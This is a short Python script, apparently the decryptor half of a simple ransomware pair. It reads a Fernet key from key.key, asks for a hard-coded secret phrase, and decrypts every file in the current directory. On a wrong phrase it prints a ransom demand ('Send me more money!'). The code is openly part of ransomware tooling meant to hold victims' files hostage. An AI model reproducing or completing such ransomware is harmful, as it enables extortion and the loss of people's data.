import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "encryptor.py" or file == "key.key" or file == "decryptor.py":
		continue
	if os.path.isfile(file):
		files.append(file)

with open("key.key", "rb") as key:
	secretkey = key.read()
	
secretphrase = "genshit"
user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Congrats, your files are decrypted. Enjoy!")
else:
	print("Sorry, wrong secret phrase. Send me more money!")
